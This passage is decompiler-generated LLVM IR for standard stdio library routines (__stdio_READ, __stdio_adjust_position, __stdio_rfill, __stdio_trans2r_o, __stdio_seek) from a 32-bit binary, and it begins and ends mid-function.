  br i1 %v2_805396f, label %dec_label_pc_8053999, label %dec_label_pc_8053973

dec_label_pc_8053973:                             ; preds = %dec_label_pc_805395f
  %v0_8053973 = load i32, i32* @esi, align 4
  %v1_8053973 = inttoptr i32 %v0_8053973 to i32*
  %v2_8053973 = load i32, i32* %v1_8053973, align 4
  store i32 %v2_8053973, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8053977 = add i32 %v0_8053973, 44
  %v2_8053977 = inttoptr i32 %v1_8053977 to i32*
  store i32 0, i32* %v2_8053977, align 4
  %v0_805397e = load i32, i32* @esi, align 4
  %v1_805397e = add i32 %v0_805397e, 2
  %v2_805397e = inttoptr i32 %v1_805397e to i8*
  store i8 0, i8* %v2_805397e, align 1
  %v0_8053982 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053982 = and i32 %v0_8053982, -72
  store i32 %v1_8053982, i32* %eax.global-to-local, align 4
  %v1_8053985 = trunc i32 %v1_8053982 to i16
  %v2_8053985 = load i32, i32* @esi, align 4
  %v3_8053985 = inttoptr i32 %v2_8053985 to i16*
  store i16 %v1_8053985, i16* %v3_8053985, align 2
  %v0_8053988 = load i32, i32* @esi, align 4
  %v1_8053988 = add i32 %v0_8053988, 8
  %v2_8053988 = inttoptr i32 %v1_8053988 to i32*
  %v3_8053988 = load i32, i32* %v2_8053988, align 4
  store i32 %v3_8053988, i32* %eax.global-to-local, align 4
  %v2_805398b = add i32 %v0_8053988, 16
  %v3_805398b = inttoptr i32 %v2_805398b to i32*
  store i32 %v3_8053988, i32* %v3_805398b, align 4
  %v0_805398e = load i32, i32* %eax.global-to-local, align 4
  %v1_805398e = load i32, i32* @esi, align 4
  %v2_805398e = add i32 %v1_805398e, 20
  %v3_805398e = inttoptr i32 %v2_805398e to i32*
  store i32 %v0_805398e, i32* %v3_805398e, align 4
  %v0_8053991 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053991 = load i32, i32* @esi, align 4
  %v2_8053991 = add i32 %v1_8053991, 24
  %v3_8053991 = inttoptr i32 %v2_8053991 to i32*
  store i32 %v0_8053991, i32* %v3_8053991, align 4
  %v0_8053994 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053994 = load i32, i32* @esi, align 4
  %v2_8053994 = add i32 %v1_8053994, 28
  %v3_8053994 = inttoptr i32 %v2_8053994 to i32*
  store i32 %v0_8053994, i32* %v3_8053994, align 4
  br label %dec_label_pc_805399c

dec_label_pc_8053999:                             ; preds = %dec_label_pc_805395f, %dec_label_pc_805394b, %dec_label_pc_8053936
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805399c

dec_label_pc_805399c:                             ; preds = %dec_label_pc_8053973, %dec_label_pc_8053999
  br i1 %v1_8053910, label %dec_label_pc_80539b1, label %dec_label_pc_80539a0

dec_label_pc_80539a0:                             ; preds = %dec_label_pc_805399c
  %v2_80539a4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_80539a4, i32* @eax, align 4
  %v3_80539a9 = call i32 @__pthread_return_void(i32 %v2_80539a4, i32 1)
  store i32 %v3_80539a9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80539b1

dec_label_pc_80539b1:                             ; preds = %dec_label_pc_805399c, %dec_label_pc_80538f8, %dec_label_pc_80539a0
  %v0_80539b4 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80539b4, i32* %eax.global-to-local, align 4
  store i32 %v0_80538d7, i32* @ebx, align 4
  store i32 %v0_80538d6, i32* @esi, align 4
  store i32 %v0_80538d5, i32* @edi, align 4
  store i32 %v0_80538d4, i32* @ebp, align 4
  ret i32 %v0_80539b4

; uselistorder directives
  uselistorder i32 %v2_8053961.pre-phi, { 1, 0 }
  uselistorder i32 %v0_8053946, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i8 64, { 1, 4, 5, 6, 2, 3, 0 }
  uselistorder i32 (i32)* @__pthread_return_0, { 28, 4, 3, 18, 17, 16, 15, 14, 5, 27, 33, 32, 12, 1, 0, 2, 8, 31, 7, 13, 21, 20, 19, 23, 22, 30, 11, 29, 6, 10, 9, 26, 25, 24 }
  uselistorder i32 (i32, i32)* @__pthread_return_void, { 49, 48, 45, 2, 1, 0, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 4, 3, 47, 46, 59, 58, 57, 56, 16, 15, 8, 7, 55, 54, 6, 5, 18, 17, 34, 33, 32, 31, 30, 29, 38, 37, 36, 35, 53, 52, 14, 13, 51, 50, 12, 11, 10, 9, 44, 43, 42, 41, 40, 39 }
  uselistorder i32 134552351, { 2, 3, 27, 28, 29, 30, 31, 32, 0, 4, 5, 6, 7, 8, 9, 10, 11, 12, 1, 20, 21, 22, 13, 23, 14, 15, 16, 17, 24, 25, 26, 18, 19 }
  uselistorder i32 52, { 7, 0, 12, 1, 2, 3, 4, 13, 14, 5, 10, 6, 8, 15, 11, 9 }
  uselistorder i32 22, { 8, 14, 2, 3, 4, 5, 6, 13, 12, 9, 10, 11, 15, 7, 0, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80539b1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805399c, { 1, 0 }
  uselistorder label %dec_label_pc_805395f, { 1, 0 }
  uselistorder label %dec_label_pc_8053931, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80539bc = load i32, i32* @ebx, align 4
  store i32 %v0_80539bc, i32* %stack_var_-4, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v4_80539c2 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80539c2, i32* @ebx, align 4
  %v1_80539ca = bitcast i16* %arg1 to i8*
  %v2_80539ca = load i8, i8* %v1_80539ca, align 1
  %v3_80539ca = and i8 %v2_80539ca, 4
  %v4_80539ca = icmp eq i8 %v3_80539ca, 0
  %v1_80539cd = icmp eq i1 %v4_80539ca, false
  br i1 %v1_80539cd, label %dec_label_pc_8053a05, label %dec_label_pc_80539cf

dec_label_pc_80539cf:                             ; preds = %entry
  %v2_80539cf = icmp slt i32 %arg3, 0
  %v3_80539d6 = select i1 %v2_80539cf, i32 2147483647, i32 %arg3
  %v1_80539df = add i32 %v4_80539c2, 4
  %v2_80539df = inttoptr i32 %v1_80539df to i32*
  %v3_80539df = load i32, i32* %v2_80539df, align 4
  %v3_80539e2 = inttoptr i32 %arg2 to i32*
  %v4_80539e2 = call i32 @__libc_read(i32 %v3_80539df, i32* %v3_80539e2, i32 %v3_80539d6)
  store i32 %v4_80539e2, i32* %ecx.global-to-local, align 4
  %tmp11 = icmp slt i32 %v4_80539e2, 1
  %tmp12 = icmp eq i1 %tmp11, false
  br i1 %tmp12, label %dec_label_pc_8053a05, label %dec_label_pc_80539f1

dec_label_pc_80539f1:                             ; preds = %dec_label_pc_80539cf
  %v1_80539ea = icmp eq i32 %v4_80539e2, 0
  %v4_80539ef = icmp eq i1 %v1_80539ea, false
  %v0_80539f1 = load i32, i32* @ebx, align 4
  %v1_80539f1 = inttoptr i32 %v0_80539f1 to i32*
  %v2_80539f1 = load i32, i32* %v1_80539f1, align 4
  br i1 %v4_80539ef, label %dec_label_pc_80539fd, label %dec_label_pc_80539f5

dec_label_pc_80539f5:                             ; preds = %dec_label_pc_80539f1
  %v1_80539f5 = or i32 %v2_80539f1, 4
  %v1_80539f8 = trunc i32 %v1_80539f5 to i16
  %v3_80539f8 = inttoptr i32 %v0_80539f1 to i16*
  store i16 %v1_80539f8, i16* %v3_80539f8, align 2
  br label %dec_label_pc_8053a05

dec_label_pc_80539fd:                             ; preds = %dec_label_pc_80539f1
  %v1_80539fd = or i32 %v2_80539f1, 8
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_8053a02 = trunc i32 %v1_80539fd to i16
  %v3_8053a02 = inttoptr i32 %v0_80539f1 to i16*
  store i16 %v1_8053a02, i16* %v3_8053a02, align 2
  br label %dec_label_pc_8053a05

dec_label_pc_8053a05:                             ; preds = %dec_label_pc_80539cf, %entry, %dec_label_pc_80539f5, %dec_label_pc_80539fd
  %v0_8053a06 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8053a09 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053a09, i32* @ebx, align 4
  ret i32 %v0_8053a06

; uselistorder directives
  uselistorder i32 %v4_80539e2, { 2, 0, 1 }
  uselistorder i32* %ecx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 (i32, i32*, i32)* @__libc_read, { 1, 0, 2 }
  uselistorder i32 2147483647, { 2, 0, 1, 3 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8053a05, { 3, 2, 0, 1 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v4_8053a14 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8053a14, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_8053a1c = load i16, i16* %arg1, align 2
  %v3_8053a1c = zext i16 %v2_8053a1c to i32
  store i32 %v3_8053a1c, i32* %ecx.global-to-local, align 4
  %tmp = urem i16 %v2_8053a1c, 4
  %v1_8053a21 = zext i16 %tmp to i32
  %v2_8053a21 = icmp eq i16 %tmp, 0
  br i1 %v2_8053a21, label %dec_label_pc_8053a50, label %dec_label_pc_8053a26

dec_label_pc_8053a26:                             ; preds = %entry
  %v1_8053a28 = add nsw i32 %v1_8053a21, -1
  %v8_8053a28 = icmp eq i32 %v1_8053a28, 0
  store i32 %v1_8053a28, i32* @edx, align 4
  br i1 %v8_8053a28, label %dec_label_pc_8053a50, label %dec_label_pc_8053a2b

dec_label_pc_8053a2b:                             ; preds = %dec_label_pc_8053a26
  %v3_8053a2b = and i32 %v3_8053a1c, 2048
  %v4_8053a2b = icmp eq i32 %v3_8053a2b, 0
  br i1 %v4_8053a2b, label %dec_label_pc_8053a50, label %dec_label_pc_8053a30

dec_label_pc_8053a30:                             ; preds = %dec_label_pc_8053a2b
  %v6_8053a30 = sub nsw i32 1, %v1_8053a21
  %v7_8053a30 = and i32 %v1_8053a28, %v6_8053a30
  %v8_8053a30 = icmp slt i32 %v7_8053a30, 0
  %v9_8053a30 = icmp eq i16 %tmp, 2
  %v10_8053a30 = icmp ult i16 %tmp, 2
  %v3_8053a33 = icmp eq i1 %v10_8053a30, %v8_8053a30
  %v4_8053a33 = icmp eq i1 %v9_8053a30, false
  %v5_8053a33 = and i1 %v4_8053a33, %v3_8053a33
  br i1 %v5_8053a33, label %dec_label_pc_8053aa4, label %dec_label_pc_8053a35

dec_label_pc_8053a35:                             ; preds = %dec_label_pc_8053a30
  %v1_8053a35 = add i32 %v4_8053a14, 40
  %v2_8053a35 = inttoptr i32 %v1_8053a35 to i32*
  %v3_8053a35 = load i32, i32* %v2_8053a35, align 4
  %v4_8053a35 = icmp eq i32 %v3_8053a35, 0
  %v1_8053a39 = icmp eq i1 %v4_8053a35, false
  br i1 %v1_8053a39, label %dec_label_pc_8053aa4, label %dec_label_pc_8053a3b

dec_label_pc_8053a3b:                             ; preds = %dec_label_pc_8053a35
  %v1_8053a3b = add i32 %v4_8053a14, 3
  %v2_8053a3b = inttoptr i32 %v1_8053a3b to i8*
  %v3_8053a3b = load i8, i8* %v2_8053a3b, align 1
  %v4_8053a3b = zext i8 %v3_8053a3b to i32
  %v2_8053a3f = sub nsw i32 %v1_8053a28, %v4_8053a3b
  %v1_8053a41 = add i32 %v4_8053a14, 44
  %v2_8053a41 = inttoptr i32 %v1_8053a41 to i32*
  %v3_8053a41 = load i32, i32* %v2_8053a41, align 4
  %v1_8053a45 = add nsw i32 %v2_8053a3f, -1
  %tmp12 = icmp slt i32 %v3_8053a41, 1
  br i1 %tmp12, label %dec_label_pc_8053a50, label %dec_label_pc_8053a4a

dec_label_pc_8053a4a:                             ; preds = %dec_label_pc_8053a3b
  %v1_8053a4a = add i32 %v4_8053a14, 2
  %v2_8053a4a = inttoptr i32 %v1_8053a4a to i8*
  %v3_8053a4a = load i8, i8* %v2_8053a4a, align 1
  %v4_8053a4a = zext i8 %v3_8053a4a to i32
  %v2_8053a4e = sub nsw i32 %v1_8053a45, %v4_8053a4a
  br label %dec_label_pc_8053a50

dec_label_pc_8053a50:                             ; preds = %dec_label_pc_8053a3b, %dec_label_pc_8053a2b, %dec_label_pc_8053a26, %entry, %dec_label_pc_8053a4a
  %v0_8053a65 = phi i32 [ %v1_8053a45, %dec_label_pc_8053a3b ], [ %v1_8053a28, %dec_label_pc_8053a2b ], [ 0, %dec_label_pc_8053a26 ], [ 0, %entry ], [ %v2_8053a4e, %dec_label_pc_8053a4a ]
  %v2_8053a50 = and i32 %v3_8053a1c, 64
  %v3_8053a50 = icmp eq i32 %v2_8053a50, 0
  %storemerge.in.in.v = select i1 %v3_8053a50, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %v4_8053a14
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_8053a5d = add i32 %v4_8053a14, 16
  %v3_8053a5d = inttoptr i32 %v2_8053a5d to i32*
  %v4_8053a5d = load i32, i32* %v3_8053a5d, align 4
  %v5_8053a5d = sub i32 %storemerge, %v4_8053a5d
  %v1_8053a60 = inttoptr i32 %arg2 to i32*
  %v2_8053a60 = load i32, i32* %v1_8053a60, align 4
  store i32 %v2_8053a60, i32* %ecx.global-to-local, align 4
  %v1_8053a62 = add i32 %arg2, 4
  %v2_8053a62 = inttoptr i32 %v1_8053a62 to i32*
  %v3_8053a62 = load i32, i32* %v2_8053a62, align 4
  store i32 %v3_8053a62, i32* %ebx.global-to-local, align 4
  %v2_8053a65 = add i32 %v5_8053a5d, %v0_8053a65
  store i32 %v2_8053a65, i32* %esi.global-to-local, align 4
  %v5_8053a79 = sub i32 %v2_8053a60, %v2_8053a65
  %v10_8053a79 = icmp ult i32 %v2_8053a60, %v2_8053a65
  %v6_8053a7d = zext i1 %v10_8053a79 to i32
  %tmp14 = icmp slt i32 %v2_8053a65, 0
  %v2_8053a6a.neg = zext i1 %tmp14 to i32
  %v7_8053a7d = add i32 %v3_8053a62, %v2_8053a6a.neg
  %v8_8053a7d = add i32 %v7_8053a7d, %v6_8053a7d
  store i32 %v8_8053a7d, i32* @edx, align 4
  store i32 %v5_8053a79, i32* %v1_8053a60, align 4
  %v0_8053a83 = load i32, i32* @edx, align 4
  %v1_8053a83 = load i32, i32* %edi.global-to-local, align 4
  %v2_8053a83 = add i32 %v1_8053a83, 4
  %v3_8053a83 = inttoptr i32 %v2_8053a83 to i32*
  store i32 %v0_8053a83, i32* %v3_8053a83, align 4
  %v0_8053a86 = load i32, i32* %edi.global-to-local, align 4
  %v1_8053a86 = add i32 %v0_8053a86, 4
  %v2_8053a86 = inttoptr i32 %v1_8053a86 to i32*
  %v3_8053a86 = load i32, i32* %v2_8053a86, align 4
  %v4_8053a86 = load i32, i32* %ebx.global-to-local, align 4
  %v5_8053a89 = icmp slt i32 %v3_8053a86, %v4_8053a86
  br i1 %v5_8053a89, label %dec_label_pc_8053a93, label %dec_label_pc_8053a8b

dec_label_pc_8053a8b:                             ; preds = %dec_label_pc_8053a50
  %v8_8053a8b = icmp sgt i32 %v3_8053a86, %v4_8053a86
  br i1 %v8_8053a8b, label %dec_label_pc_8053a91, label %dec_label_pc_8053a8d

dec_label_pc_8053a8d:                             ; preds = %dec_label_pc_8053a8b
  %v1_8053a8d = inttoptr i32 %v0_8053a86 to i32*
  %v2_8053a8d = load i32, i32* %v1_8053a8d, align 4
  %v3_8053a8d = load i32, i32* %ecx.global-to-local, align 4
  %tmp15 = icmp ugt i32 %v2_8053a8d, %v3_8053a8d
  br i1 %tmp15, label %dec_label_pc_8053a91, label %dec_label_pc_8053a93

dec_label_pc_8053a91:                             ; preds = %dec_label_pc_8053a8d, %dec_label_pc_8053a8b
  %v0_8053a91 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053a91 = sub i32 0, %v0_8053a91
  store i32 %v1_8053a91, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8053a93

dec_label_pc_8053a93:                             ; preds = %dec_label_pc_8053a8d, %dec_label_pc_8053a50, %dec_label_pc_8053a91
  %v0_8053a93 = load i32, i32* %esi.global-to-local, align 4
  %v2_8053a93 = icmp slt i32 %v0_8053a93, 0
  %v1_8053a95 = icmp eq i1 %v2_8053a93, false
  br i1 %v1_8053a95, label %dec_label_pc_8053aa7, label %dec_label_pc_8053a97

dec_label_pc_8053a97:                             ; preds = %dec_label_pc_8053a93
  %v1_8053a97 = call i32 @__errno_location(i32 %v2_8053a65)
  %v1_8053a9c = inttoptr i32 %v1_8053a97 to i32*
  store i32 75, i32* %v1_8053a9c, align 4
  %v0_8053aaa.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8053aa7

dec_label_pc_8053aa4:                             ; preds = %dec_label_pc_8053a35, %dec_label_pc_8053a30
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8053aa7

dec_label_pc_8053aa7:                             ; preds = %dec_label_pc_8053a93, %dec_label_pc_8053a97, %dec_label_pc_8053aa4
  %v0_8053aaa = phi i32 [ %v0_8053a93, %dec_label_pc_8053a93 ], [ %v0_8053aaa.pre, %dec_label_pc_8053a97 ], [ -1, %dec_label_pc_8053aa4 ]
  ret i32 %v0_8053aaa

; uselistorder directives
  uselistorder i32 %v4_8053a86, { 1, 0 }
  uselistorder i32 %v3_8053a86, { 1, 0 }
  uselistorder i32 %v2_8053a65, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v1_8053a28, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v4_8053a14, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 75, { 1, 0 }
  uselistorder i16 2, { 0, 1, 4, 2, 3 }
  uselistorder i32 2048, { 3, 0, 4, 1, 2, 7, 8, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8053aa7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053a93, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053a50, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_8053ab0 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8053ab8 = add i32 %arg1, 8
  %v2_8053ab8 = inttoptr i32 %v1_8053ab8 to i32*
  %v3_8053ab8 = load i32, i32* %v2_8053ab8, align 4
  store i32 %v3_8053ab8, i32* %edx.global-to-local, align 4
  %v1_8053abb = add i32 %arg1, 12
  %v2_8053abb = inttoptr i32 %v1_8053abb to i32*
  %v3_8053abb = load i32, i32* %v2_8053abb, align 4
  %v2_8053abe = sub i32 %v3_8053abb, %v3_8053ab8
  %v3_8053ac3 = inttoptr i32 %arg1 to i16*
  %v4_8053ac3 = call i32 @__stdio_READ(i16* %v3_8053ac3, i32 %v3_8053ab8, i32 %v2_8053abe)
  %v0_8053ac8 = load i32, i32* @ebx, align 4
  %v1_8053ac8 = add i32 %v0_8053ac8, 8
  %v2_8053ac8 = inttoptr i32 %v1_8053ac8 to i32*
  %v3_8053ac8 = load i32, i32* %v2_8053ac8, align 4
  store i32 %v3_8053ac8, i32* %edx.global-to-local, align 4
  %v2_8053acb = add i32 %v0_8053ac8, 16
  %v3_8053acb = inttoptr i32 %v2_8053acb to i32*
  store i32 %v3_8053ac8, i32* %v3_8053acb, align 4
  %v0_8053ace = load i32, i32* %edx.global-to-local, align 4
  %v2_8053ace = add i32 %v0_8053ace, %v4_8053ac3
  store i32 %v2_8053ace, i32* %edx.global-to-local, align 4
  %v1_8053ad0 = load i32, i32* @ebx, align 4
  %v2_8053ad0 = add i32 %v1_8053ad0, 20
  %v3_8053ad0 = inttoptr i32 %v2_8053ad0 to i32*
  store i32 %v2_8053ace, i32* %v3_8053ad0, align 4
  store i32 %v0_8053ab0, i32* @ebx, align 4
  ret i32 %v4_8053ac3

; uselistorder directives
  uselistorder i32 %v4_8053ac3, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8053ad8 = load i32, i32* @ebx, align 4
  %v4_8053adc = ptrtoint i16* %arg1 to i32
  store i32 %v4_8053adc, i32* @ebx, align 4
  %v2_8053ae4 = load i16, i16* %arg1, align 2
  %v3_8053ae4 = zext i16 %v2_8053ae4 to i32
  %v2_8053ae7 = and i32 %v3_8053ae4, %arg2
  %v3_8053ae7 = icmp eq i32 %v2_8053ae7, 0
  %v1_8053ae9 = icmp eq i1 %v3_8053ae7, false
  br i1 %v1_8053ae9, label %dec_label_pc_8053af7, label %dec_label_pc_8053aeb

dec_label_pc_8053aeb:                             ; preds = %entry
  %v1_8053aeb = and i32 %v3_8053ae4, 2176
  %v2_8053aeb = icmp eq i32 %v1_8053aeb, 0
  %v1_8053af0 = icmp eq i1 %v2_8053aeb, false
  br i1 %v1_8053af0, label %dec_label_pc_8053afe, label %dec_label_pc_8053af2

dec_label_pc_8053af2:                             ; preds = %dec_label_pc_8053aeb
  %v2_8053af2 = or i32 %v3_8053ae4, %arg2
  %v1_8053af4 = trunc i32 %v2_8053af2 to i16
  store i16 %v1_8053af4, i16* %arg1, align 2
  %v0_8053af7.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053af7

dec_label_pc_8053af7:                             ; preds = %entry, %dec_label_pc_8053af2
  %v0_8053b1d = phi i32 [ %v4_8053adc, %entry ], [ %v0_8053af7.pre, %dec_label_pc_8053af2 ]
  %v1_8053af7 = inttoptr i32 %v0_8053b1d to i16*
  %v2_8053af7 = load i16, i16* %v1_8053af7, align 2
  %v2_8053afa = and i16 %v2_8053af7, 16
  %v3_8053afa = icmp eq i16 %v2_8053afa, 0
  br i1 %v3_8053afa, label %dec_label_pc_8053b16, label %dec_label_pc_8053afe

dec_label_pc_8053afe:                             ; preds = %dec_label_pc_8053af7, %dec_label_pc_8053aeb
  %v1_8053afe = call i32 @__errno_location(i32 %v0_8053ad8)
  %v1_8053b03 = inttoptr i32 %v1_8053afe to i32*
  store i32 9, i32* %v1_8053b03, align 4
  br label %dec_label_pc_8053b09

dec_label_pc_8053b09:                             ; preds = %dec_label_pc_8053b1a, %dec_label_pc_8053afe
  %v0_8053b09 = load i32, i32* @ebx, align 4
  %v1_8053b09 = inttoptr i32 %v0_8053b09 to i32*
  %v2_8053b09 = load i32, i32* %v1_8053b09, align 4
  %v1_8053b0b = or i32 %v2_8053b09, 8
  %v1_8053b0e = trunc i32 %v1_8053b0b to i16
  %v3_8053b0e = inttoptr i32 %v0_8053b09 to i16*
  store i16 %v1_8053b0e, i16* %v3_8053b0e, align 2
  br label %dec_label_pc_8053b42

dec_label_pc_8053b16:                             ; preds = %dec_label_pc_8053af7
  %v2_8053b16 = and i16 %v2_8053af7, 64
  %v3_8053b16 = icmp eq i16 %v2_8053b16, 0
  br i1 %v3_8053b16, label %dec_label_pc_8053b38, label %dec_label_pc_8053b1a

dec_label_pc_8053b1a:                             ; preds = %dec_label_pc_8053b16
  %v2_8053b1e = call i32 @__stdio_wcommit(i32 %v0_8053b1d)
  %v1_8053b26 = icmp eq i32 %v2_8053b1e, 0
  %v1_8053b28 = icmp eq i1 %v1_8053b26, false
  br i1 %v1_8053b28, label %dec_label_pc_8053b09, label %dec_label_pc_8053b2a

dec_label_pc_8053b2a:                             ; preds = %dec_label_pc_8053b1a
  %v0_8053b2a = load i32, i32* @ebx, align 4
  %v1_8053b2a = add i32 %v0_8053b2a, 8
  %v2_8053b2a = inttoptr i32 %v1_8053b2a to i32*
  %v3_8053b2a = load i32, i32* %v2_8053b2a, align 4
  %v2_8053b2d = add i32 %v0_8053b2a, 28
  %v3_8053b2d = inttoptr i32 %v2_8053b2d to i32*
  store i32 %v3_8053b2a, i32* %v3_8053b2d, align 4
  %v0_8053b30 = load i32, i32* @ebx, align 4
  %v1_8053b30 = inttoptr i32 %v0_8053b30 to i32*
  %v2_8053b30 = load i32, i32* %v1_8053b30, align 4
  %v2_8053b30.tr = trunc i32 %v2_8053b30 to i16
  %v1_8053b35 = and i16 %v2_8053b30.tr, -65
  %v3_8053b35 = inttoptr i32 %v0_8053b30 to i16*
  store i16 %v1_8053b35, i16* %v3_8053b35, align 2
  %v0_8053b38.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053b38

dec_label_pc_8053b38:                             ; preds = %dec_label_pc_8053b16, %dec_label_pc_8053b2a
  %v2_8053b3d = phi i32 [ %v0_8053b1d, %dec_label_pc_8053b16 ], [ %v0_8053b38.pre, %dec_label_pc_8053b2a ]
  %v1_8053b38 = inttoptr i32 %v2_8053b3d to i32*
  %v2_8053b38 = load i32, i32* %v1_8053b38, align 4
  %v1_8053b3a = or i32 %v2_8053b38, 1
  %v1_8053b3d = trunc i32 %v1_8053b3a to i16
  %v3_8053b3d = inttoptr i32 %v2_8053b3d to i16*
  store i16 %v1_8053b3d, i16* %v3_8053b3d, align 2
  br label %dec_label_pc_8053b42

dec_label_pc_8053b42:                             ; preds = %dec_label_pc_8053b09, %dec_label_pc_8053b38
  %storemerge = phi i32 [ 0, %dec_label_pc_8053b38 ], [ -1, %dec_label_pc_8053b09 ]
  %v2_8053b42 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053b42, i32* @edx, align 4
  store i32 %v0_8053ad8, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8053ae4, { 0, 2, 1 }
  uselistorder i32 %v0_8053ad8, { 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 3, 6, 5, 4, 2, 1, 0 }
  uselistorder i16 0, { 0, 8, 2, 1, 9, 6, 10, 7, 11, 12, 13, 14, 15, 16, 17, 3, 4, 5 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8053b42, { 1, 0 }
  uselistorder label %dec_label_pc_8053b38, { 1, 0 }
  uselistorder label %dec_label_pc_8053af7, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_8053b54 = add i32 %tmp5, 4
  %v2_8053b54 = inttoptr i32 %v1_8053b54 to i32*
  %v3_8053b54 = load i32, i32* %v2_8053b54, align 4
  %v2_8053b57 = load i32, i32* %arg2, align 4
  %v1_8053b5d = add i32 %arg1, 4
  %v2_8053b5d = inttoptr i32 %v1_8053b5d to i32*
  %v3_8053b5d = load i32, i32* %v2_8053b5d, align 4
  %v4_8053b60 = call i32 @__libc_lseek64(i32 %v3_8053b5d, i32 %v2_8053b57, i32 %v3_8053b54, i32 %arg3)
  %v0_8053b68 = load i32, i32* @edx, align 4
  %v2_8053b68 = icmp slt i32 %v0_8053b68, 0
  store i32 %v4_8053b60, i32* %ecx.global-to-local, align 4
  br i1 %v2_8053b68, label %dec_label_pc_8053b75, label %dec_label_pc_8053b6e

dec_label_pc_8053b6e:                             ; preds = %entry
  %v1_8053b6e = load i32, i32* @ebx, align 4
  %v2_8053b6e = inttoptr i32 %v1_8053b6e to i32*
  store i32 %v4_8053b60, i32* %v2_8053b6e, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v0_8053b72 = load i32, i32* @edx, align 4
  %v1_8053b72 = load i32, i32* @ebx, align 4
  %v2_8053b72 = add i32 %v1_8053b72, 4
  %v3_8053b72 = inttoptr i32 %v2_8053b72 to i32*
  store i32 %v0_8053b72, i32* %v3_8053b72, align 4
  %v0_8053b76.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8053b75

dec_label_pc_8053b75:                             ; preds = %entry, %dec_label_pc_8053b6e
  %v0_8053b76 = phi i32 [ %v4_8053b60, %entry ], [ %v0_8053b76.pre, %dec_label_pc_8053b6e ]
  ret i32 %v0_8053b76

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder label %dec_label_pc_8053b75, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_8053b7e = ptrtoint i8* %arg1 to i32
  %v4_8053b86.pre = load i32, i32* @eax, align 4
  %v8_8053b86.pre = load i1, i1* @df, align 1
  %v9_8053b86 = select i1 %v8_8053b86.pre, i32 -1, i32 1
  br label %dec_label_pc_8053b86

dec_label_pc_8053b86:                             ; preds = %dec_label_pc_8053b8a, %entry
  %v20_8053b87 = phi i32 [ %v23_8053b87, %dec_label_pc_8053b8a ], [ %arg2, %entry ]
  %v4_8053b86 = phi i32 [ %v6_8053b86, %dec_label_pc_8053b8a ], [ %v4_8053b86.pre, %entry ]
